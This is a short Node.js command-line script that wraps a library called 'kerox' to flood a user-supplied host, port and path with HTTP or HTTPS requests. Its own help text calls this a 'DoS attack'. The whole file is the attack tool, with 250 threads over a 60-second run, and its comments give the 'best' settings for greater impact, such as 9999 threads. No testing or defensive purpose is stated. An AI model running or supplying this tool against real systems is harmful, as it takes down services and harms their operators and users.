#! /usr/bin/env node
const yargs = require("yargs");
const { hideBin } = require('yargs/helpers');

yargs(hideBin(process.argv))
   .command("dos [OPTIONS]...", "Start a DoS attack from your machine", (yargs) => {
      return yargs
         // Required
         .option("ssl", {
            alias: "s",
            describe: "Whether to use HTTPS or HTTP",
            type: "boolean",
            demandOption: false,
            requiresArg: false,
            default: false
         })
         .option("host", {
            alias: "h",
            describe: "Target hostname or IP address",
            type: "string",
            demandOption: true,
            requiresArg: true
         })
         // Optional
         .option("port", {
            alias: "p",
            describe: "Target port",
            type: "number",
            demandOption: false,
            requiresArg: true
         })
         .option("route", {
            alias: "r",
            describe: "Target route or path",
            type: "string",
            demandOption: false,
            requiresArg: true,
            default: "/"
         })
   }, (argv) => {
      // Validate arguments
      if (argv.port && (argv.port < 1 || argv.port > 65535))
         return console.error("Invalid port number:"._Red, argv.port);
      if (argv.route[0] !== "/") argv.route = "/" + argv.route;
      const url = (argv.ssl ? "https" : "http") + "://" + argv.host + (argv.port ? ":" + argv.port : "") + argv.route;
      if (!URL.canParse(url))
         return console.error("Unable to parse target URL:", url);
      // DoS attack
      const { Kerox, Status } = require("kerox");
      const kerox = new Kerox({
         refreshRate: 5,
         updateInterval: 1000,
         useProxies: false,
         validateProxies: true
      });
      if (kerox.status === Status.Idle)
         execute();
      else
         kerox.once("idle", execute);

      function execute() {
         kerox.ddos({
            target: url,
            duration: 60,
            multiplier: 2,                      // best 2
            threads: 250,                       // best 9999
            CPUs: 4,                            // best 4
            // agent: { keepAlive: true },      // best null
            dropRequests: false,                // best false
            display: {
               progressBar: true,
               statistics: true,
               httpCodes: true,
            }
         });
      }
   }).parse();
